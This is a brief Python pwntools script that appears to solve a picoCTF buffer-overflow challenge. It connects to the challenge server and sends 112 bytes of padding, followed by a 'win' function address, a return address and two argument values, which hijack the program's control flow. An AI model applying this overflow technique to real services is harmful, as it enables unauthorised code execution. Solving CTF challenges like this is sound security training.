import os
from pwn import *

os.system('clear')

arg1 = 0xCAFEF00D
arg2 = 0xF00DF00D
win = 0x8049296
main = 0x8049372

sh = remote('saturn.picoctf.net', 62805)

sh.recvuntil('\n')
p = b'A' * 112 
p += p32(134517398) # the win function decimal
p += p32(134517618) # the main function decimal
p += p32(3405705229) # arg1 decimal representation
p += p32(4027445261) # arg2 decimal representation

sh.sendline(p)

sh.interactive()
